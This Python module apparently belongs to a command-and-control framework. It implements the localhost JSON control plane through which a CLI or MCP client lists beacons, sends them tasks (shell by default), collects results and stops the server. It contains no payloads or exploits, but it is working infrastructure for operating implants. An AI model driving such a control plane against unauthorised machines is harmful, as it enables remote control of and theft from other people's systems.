"""C2 control-plane protocol — attach CLI/MCP to a long-lived daemon.

Control messages are length-prefixed JSON (same framing as C2 data plane),
plaintext on localhost by default.

Request:  {"op": "status"|"beacons"|"task"|"results"|"stop"|"interact", ...}
Response: {"ok": true/false, "data": ..., "error": ...}
"""

from __future__ import annotations

import asyncio
import struct
from typing import Any

import orjson


def pack_ctrl(msg: dict) -> bytes:
    body = orjson.dumps(msg)
    return struct.pack(">I", len(body)) + body


async def read_ctrl(reader: asyncio.StreamReader) -> dict | None:
    try:
        hdr = await reader.readexactly(4)
    except asyncio.IncompleteReadError:
        return None
    (length,) = struct.unpack(">I", hdr)
    if length > 4 * 1024 * 1024:
        return None
    body = await reader.readexactly(length)
    return orjson.loads(body)


async def control_request(host: str, port: int, msg: dict, timeout: float = 10.0) -> dict:
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
    except Exception as e:
        return {"ok": False, "error": f"cannot connect control plane {host}:{port}: {e}"}
    try:
        writer.write(pack_ctrl(msg))
        await writer.drain()
        resp = await asyncio.wait_for(read_ctrl(reader), timeout=timeout)
        return resp or {"ok": False, "error": "empty response"}
    except Exception as e:
        return {"ok": False, "error": str(e)}
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass


class ControlPlane:
    """Serves control ops against a live C2Server instance."""

    def __init__(self, c2: Any, host: str = "127.0.0.1", port: int = 8444) -> None:
        self.c2 = c2
        self.host = host
        self.port = port
        self._server: asyncio.Server | None = None
        self._task: asyncio.Task | None = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._handle, self.host, self.port)
        self._task = asyncio.create_task(self._serve())

    async def _serve(self) -> None:
        assert self._server
        async with self._server:
            await self._server.serve_forever()

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            req = await read_ctrl(reader)
            if not req:
                writer.write(pack_ctrl({"ok": False, "error": "bad request"}))
                await writer.drain()
                return
            resp = await self._dispatch(req)
            writer.write(pack_ctrl(resp))
            await writer.drain()
        except Exception as e:
            try:
                writer.write(pack_ctrl({"ok": False, "error": str(e)}))
                await writer.drain()
            except Exception:
                pass
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def _dispatch(self, req: dict) -> dict:
        op = req.get("op")
        c2 = self.c2
        if op == "status":
            return {
                "ok": True,
                "data": {
                    "running": c2.running,
                    "host": c2.host,
                    "port": c2.port,
                    "encrypted": c2.key is not None,
                    "beacons": len(c2.beacons),
                    "active": c2.active_id,
                },
            }
        if op == "beacons":
            return {"ok": True, "data": {"beacons": c2.list_beacons(), "active": c2.active_id}}
        if op == "task":
            bid = req.get("beacon") or c2.active_id
            mtype = req.get("type") or "shell"
            data = req.get("data") or {}
            if not bid:
                return {"ok": False, "error": "no beacon"}
            ok = await c2.task(bid, mtype, data)
            return {"ok": ok, "data": {"beacon": bid, "type": mtype}}
        if op == "results":
            bid = req.get("beacon") or c2.active_id
            if not bid:
                return {"ok": False, "error": "no beacon"}
            return {"ok": True, "data": {"results": c2.get_results(bid, clear=bool(req.get("clear")))}}
        if op == "interact":
            bid = req.get("beacon")
            if not bid or not c2.interact(bid):
                return {"ok": False, "error": "beacon not found"}
            if req.get("label"):
                c2.set_label(bid, str(req["label"]))
            return {"ok": True, "data": {"active": bid}}
        if op == "stop":
            await c2.stop()
            asyncio.get_event_loop().call_soon(lambda: None)
            return {"ok": True, "data": {"stopping": True}}
        return {"ok": False, "error": f"unknown op: {op}"}
